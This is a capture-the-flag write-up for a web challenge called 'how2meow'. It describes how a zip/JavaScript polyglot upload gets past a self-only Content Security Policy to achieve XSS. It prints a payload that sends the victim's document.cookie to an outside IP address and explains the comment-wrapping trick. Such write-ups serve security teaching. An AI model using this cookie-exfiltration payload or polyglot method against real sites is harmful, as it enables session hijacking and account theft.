# how2meow

> Author: howard41436 | 楊皓丞 | B06902097

### Description

I don't always meow meow meow meow, but when I do, I meow meow meow meow.

### Solution

This is a problem like HW4. We need to find a way to XSS, then steal admin's cookie by reporting the url to admin. Since the CSP only allow scripts in self to execute, we need to upload the payload using the meow uploader. However, the file we uploaded will only be moved to the directory we can access if it can be unzipped, and a file `meow` needs to exist with content starting with `edu-ctf` is extracted. Therefore, we have to upload a valid zip file that is also a javascript. File content of text files will be directly stored in the zip file's binary, so I can put the payload `*/window.location.href="http://140.112.30.33:8888/?x="+btoa(document.cookie);/*` in `evil`, which is zipped together with `meow.` Then, after zipping, I inserted `/*` at the start of the binary and `*/` at the end of the binary. This won't affect the zip file; it can still be unzipped correctly. So now the binary looked like `/*.....*/EVIL PAYLOAD/*....*/`, which is a valid javascript code because the dirty parts are commented. Now, the XSS succeeded, and after reporting the url to the admin, we stole the flag. 